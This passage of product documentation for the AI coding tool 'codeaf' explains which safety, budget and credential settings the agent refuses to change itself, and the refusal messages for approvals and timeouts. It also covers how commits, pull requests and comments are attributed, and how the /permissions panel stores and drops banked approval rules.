is the approval mode, and you would have lost the gate without ever deciding to.

The refusal names the row and points here:

```
"ask before running" (tools.approvalMode) decides what I may do without asking you first, so it is not mine to change. Open /settings and change it yourself.
```

The whole list, by settings key:

- **What may run without asking you** — `tools.approvalMode`,
  `tools.approval`, `tools.bashPatterns`, `approval.guardian`,
  `approval.timeout_seconds`, `task.autoapprove_seconds`. The gate, the two rule
  rows, the model that answers in your place, the reminder that pauses rather
  than answering no, and the task clock that starts work if you say nothing.
- **What may be spent without asking you** — `daily_budget_usd`,
  `plan_consent_usd`, `practice_budget_usd`, `session.spendRailUSD`,
  `task.repair_rounds`, `working_set_tokens`, `context_reuse_pct`. The last three
  are rails too: each is a number that multiplies what one piece of unattended
  work costs.
- **How hard this machine may be worked** — `task.parallel`, `task.max_load`,
  `task.min_free_mb`, `bash.background_after_seconds`. The last is labelled
  **background after** on `/settings`' Safety tab and arms both the engine's handoff
  clock and the countdown for the next session.
- **Whether codeaf's own work is checked** — `task.audit`. A session that can
  switch off the check can call anything done.
- **How work that leaves this machine is signed** — `attribution.model`, whether
  the `Assisted-by` line names the model. The signature itself has no row.
- **Your credentials** — `search.exaKey`, `search.firecrawlKey`, `search.jinaKey`,
  `google_oauth_secret`, and `google_oauth_client`, which is useless without the
  secret beside it. These restrain nothing; they are refused because a key
  overwritten with something a model invented is a working account broken in a
  way nothing on screen can show you. Search credentials written by you are read
  again on the next search in the running conversation; no restart is needed.

Everything else is fair game: which model does what, how the screen draws, how
long the room stays quiet, where a search goes, which model draws your pictures.

For the background clock, the exact refusal is:

```
"background after" (bash.background_after_seconds) is one of the brakes on how much work may run at once on this machine, so it is not mine to change. Open /settings and change it yourself.
```

Two rows are refused for a different reason, and it is not safety. The
conversation's own model (`model.talk`) is changed with `/model`, and the other
role slots — `model.plan`, `model.work`, `model.verify`, `model.scribe` — are
bindings the running session holds rather than values in your profile, so
neither `change_setting` nor the panel can write them. To send codeaf's own
auxiliary calls somewhere, set the reflex or small work row on the Providers tab, pin a
crew seat — worker, checker or planner — with `/crew pin` or on the `/crew` panel that the
tab's one **seats** row opens, or pin one role in `models.roles`.

A row your environment has pinned refuses like it does everywhere else:
`<label> is set by <NAME>`.

## Does codeaf sign my commits — why is there a co-author on my commit, who is agentfield-bot, how do I turn the trailer off

codeaf signs commits it writes, and its worker harness signs the commits its
workers make. The commit mark cannot be turned off unless the repository's
CONTRIBUTING policy forbids AI trailers.

**A commit** ends with one blank line and two trailer lines, `Assisted-by`
first and the co-author last, and nothing after them:

```
Assisted-by: CodeAF (glm-5.3)
Co-Authored-By: CodeAF <267109073+agentfield-bot@users.noreply.github.com>
```

The name in brackets is the model that wrote the commit — the model the
conversation is talking to at that moment — and only the model: the provider or
company in front of it (`z-ai/`) and a routing suffix such as `:free` or
`:nitro` come off, and the model's own version or date stays. Switch with
`/model` and the next commit names the model you switched to. To hide only the
model name, turn off the **model in commits** row (`attribution.model`) in
`/settings`, or set `CODEAF_ATTRIBUTION_MODEL=0`. Then the first line is bare
`Assisted-by: CodeAF`; the co-author line remains.

**A task on the worker harness (the default) names no model.** Its workers'
own commits and its landing commit carry the bare `Assisted-by: CodeAF` and the
co-author line. The section "Does the task sign the commits it makes itself"
explains when those commits are signed or left alone.

`agentfield-bot` is codeaf's GitHub account. The numeric ID in
`267109073+agentfield-bot@users.noreply.github.com` makes GitHub link the
co-author to that account and show its avatar. The marks record provenance.

## Does the task sign the commits it makes itself — when are worker commits left unsigned

The worker harness signs its workers' commits when the run ends,
before its work comes home, and signs a landing commit for leftover edits.
It uses the bare `Assisted-by: CodeAF` line and the codeaf co-author once.
`codeaf do` signs its workers' commits in your folder when its run ends, even
when the repository had no commits before the run. It makes no landing commit
of its own. A commit you make in that folder during the run may be signed too.
An already signed commit gets no duplicate lines. codeaf keeps the commit's
author, committer, tree and message body, and leaves your repository's hooks
alone. A commit your git signed with GPG or SSH keeps what the worker wrote:
changing its message would invalidate that signature. The same is true of the
whole run's range if one commit has such a signature. A commit already pushed,
tagged, pointed at by another branch, or fetched from elsewhere and merged is
left as it is. A detached HEAD or a folder that was not a git repository when
the run started has no commits to sign. CONTRIBUTING files that forbid AI
trailers stop codeaf from adding them to its own commits too.

## What marks appear on pull requests, issues and comments

**A pull request or an issue** ends its body with a line holding an em dash, and
then one sentence:

```
—
Drafted with [CodeAF](https://agentfield.ai/github/codeaf?utm_source=github&utm_medium=pull_request&utm_campaign=drafted_with) · reviewed and owned by the author
```

On an issue that link reads `utm_medium=issue` instead.

**A comment** — on an issue, on a pull request, on a line of a review — ends
with one small muted line, no em dash above it:

```
<sub>drafted with [CodeAF](https://agentfield.ai/github/codeaf?utm_source=github&utm_medium=comment&utm_campaign=drafted_with)</sub>
```

These marks tell a reader codeaf drafted the text. A repository policy or a
policy you state can forbid them.

## Will it sign every comment it leaves — how gentle the comment line is, and where none of the three ever appear

**A comment thread gets the line once.** The first comment codeaf leaves in a
thread carries it; every later comment in that same thread carries nothing. It
is also left off entirely on a one-line reply, on anything inside a code block or
a suggestion block, and on a comment you dictated word for word — those are your
words and codeaf does not sign them.

The commit, pull-request and comment marks never appear in a commit subject, in a code file, in a README,
in anything codeaf writes for you such as a report or a deck, or in what it says
back to you in this conversation. If you see one somewhere else, that is a fault
worth reporting.

**A repository that says no wins.** codeaf reads the first 256 KiB of regular
`CONTRIBUTING`, `CONTRIBUTING.md`, `.rst` and `.txt` files (case-insensitive
names) at the top of the repository, in `.github/` and in `docs/`. It skips
links and other non-file entries. If any forbids AI trailers or
co-author lines, codeaf adds none to its own landing commits or the worker
commits it signs at the end of a run. The model is also told to follow
CONTRIBUTING or a policy you state when it writes pull requests, issues and
comments.

The commit a task writes when its work lands carries the same two lines — with
the bare `Assisted-by: CodeAF` on the worker harness, the default belt. Those
commits are authored as `codeaf <agentfield-bot@users.noreply.github.com>`: codeaf
reads that identity to tell its own commits from yours when it lands a branch.
Older task commits authored as `codeaf <codeaf@localhost>` are still recognised
as codeaf's own work, as are those under its earlier local address
`aforge <aforge@localhost>` <!-- legacy-name -->. `/task` works in a private
copy, so your own commits are outside its signing range. `codeaf do` works in
your folder, where a commit you make during its run cannot be distinguished
from a worker commit and may be signed at the end.

## I turned signing off before — why are my commits signed again, can I turn attribution off

**Signing is on by default, and there is no switch that turns it off.** Until
2026-09-23 the `attribution` row, or `CODEAF_ATTRIBUTION`, took the marks off.
Both are gone. A profile that still holds an `attribution` key — `false`
included — or a shell that still sets `CODEAF_ATTRIBUTION` is not obeyed, and
it is not ignored in silence either: the chat says this once, as a note in the
conversation, and a headless command such as `codeaf do` prints it on stderr,
after `codeaf: `, every time it starts while the key is still there:

```
the attribution row and CODEAF_ATTRIBUTION are gone: codeaf always signs the commits, pull requests, issues and comments it writes. The one part you can turn off is the model's name in the Assisted-by line, with the attribution.model row.
```

Delete the key from your profile's `config.json`, or unset the variable, and
the note stops.

**What you can still turn off is the model's name.** The **model in commits**
row (`attribution.model`, on the Workspace tab of `/settings`), or
`CODEAF_ATTRIBUTION_MODEL=0`, leaves `Assisted-by: CodeAF` with no brackets. A
landing on the worker harness, the default belt, carries that bare line either way.
codeaf cannot change the row for you — ask it to and it says so and points you
at `/settings`. A change lands on the next piece of work handed off, and on
the next codeaf you start.

**A repository policy can forbid the marks.** When a CONTRIBUTING file in the
repository's top level, `.github/` or `docs/` forbids AI trailers, codeaf's
own commits and its signing of worker commits add none. Tell the model about
any further policy for pull requests, issues or comments.

## A timeout is not a deny — why it said "denied by the person" when nobody said no

A wait that ends without an answer is not a person's no. The model used to be
handed `denied by the person: <rule>` — including `denied by the person: default`
on a `propose_task` that simply ran out of time. That sentence is only for a
key someone pressed (`n`, `d`, or `esc` on the card).

If the question timed out, the model is told `not approved: the question timed
out`. If the turn ended, or the agent closed, first: `not approved: ended
before an answer`. Silence on the card still pauses and keeps waiting; it
does not produce either of those.

## When nobody is watching

`codeaf chat --once "…"` runs with no one to ask. A "prompt" decision then
**refuses** rather than hanging or silently allowing:

```
needs approval but no resolver is attached: <rule>
```

Inside a task node the refusal reads
`refused in a task: <rule> — nobody to ask`. A wait that ends without an answer
is never worded as a person's no. A timed-out question refuses with
`not approved: the question timed out`. A turn (or the agent) that ends first
refuses with `not approved: ended before an answer`.

## What a refused call looks like to the model

Every refusal is an ordinary error result the model can act on. It is never a
hang, and never the end of the turn. The exact sentences:

- `denied by approval rule: <rule>`
- `denied by approval rule: <rule> (remembered for this session)`
- `denied by the person: <rule>`
- `not approved: the question timed out`
- `not approved: ended before an answer`
- `needs approval but no resolver is attached: <rule>`
- `refused in a task: <rule> — nobody to ask`

## Questions are never written to the session file

Consent requests and answers are events only; they never enter the session file.
A denied call never ran, so the record afterwards shows only the tool result or
the refusal handed to the model. A resumed conversation never replays a
question.

The transcript row's `allowed` / `denied` / `always · saved` annotation is one of
the few things the screen records that the session file never will.

## `/permissions`: what you have already banked

`/permissions` — alias `/perms` — lists the answers you have banked and lets you
take one back. The menu describes it as
`what runs without asking · drop one with d`.

It draws one heading, literally `what runs without asking`, and under it one row
per banked line, read fresh from disk each time it opens.

Two glyphs: `$` for a row about one shell command, `◇` for a row about a whole
tool. Shell rules keep the order they were written in, because first match wins
and reordering them would lie. Tool exceptions are sorted alphabetically.

The dim right-hand tail carries only what the heading has not already said:
nothing for a shell allow, `every call` for a tool row, `asks every time` for a
`prompt` row, `refused` for a `deny` row.

Keys: `↑`/`ctrl+p` and `↓`/`ctrl+n` move, `pgup`/`pgdown` page by 9, `enter` or
`d` arms and then drops, `esc` un-arms first and closes second. Clicking a row
moves the cursor there and arms it; clicking outside closes the panel. The list
is at most 10 lines including the heading.

With nothing banked it draws the heading and nothing under it — no "no
exceptions", no "0 rules". A settings row that does not parse is reported in the
transcript (`the shell command rules do not read back · <err>` or
`the tool exceptions do not read back · <err>`) and never redrawn as an empty
list.

**The rows are yours, not the policy in force.** Inside a repository that
answers `tools.approval`, its row replaces yours wholesale at launch, so what
you see here is what you carry everywhere else.

## Dropping a banked rule, and when it stops working

In `/permissions`, `enter` or `d` twice on a row drops it. The first press arms
it and the row's tail changes to `enter again to drop it`; the second press
drops it. Moving the cursor disarms.

A shell row is removed **by index**, because two lines may carry the same glob
and their order is your own priority statement. A tool row is removed by name,
leaving the others in the order they were written. After the drop the list is
re-read and the cursor holds its place, not its row.

The receipt in the transcript is `dropped · <name>`.

Under `--no-host`, a drop is live on the very next call. On a plain launch
through this machine's engine there is no take-back door to the running gate,
so the receipt is `dropped · <name> · from the next session`. The panel never
claims an effect it did not deliver.

`/new` and `/resume` open on the rules as they stand right now, not the ones the
session launched with.

A failed drop is said out loud. If the row moved since it was read, the error is
`"<name>" is no longer on the list`; if the setting cannot be changed here,
`"<key>" cannot be changed here`. A row your environment has pinned refuses here
exactly as it does in the settings sheet.

Dropping a line changes what you carry everywhere, and changes nothing inside a
repository that answers `tools.approval` itself.

## Where the rules are stored on disk

Your own answers live in `config.json` in your profile directory —
`$CODEAF_PROFILE_DIR` when it is set, otherwise codeaf's state root
`$CODEAF_HOME`, otherwise `~/.codeaf`.

The rows that matter here are:

- `tools.approvalMode` — the blanket mode.
- `tools.approval` — per-tool exceptions, where a tool "always" is written.
- `tools.bashPatterns` — ordered shell command rules, where a bash "always" is
  written.
- `approval.timeout_seconds` — the countdown.

A repository can answer `tools.approval` in `.codeaf/config.json` in the
directory you opened. When it does, **its row replaces yours wholesale** — it
does not merge. Nothing in the consent card or `/permissions` ever writes to a
repository's file; both write to your profile only.

Session memos — "stop asking me about this tool for now" — are held in memory
and written nowhere at all.
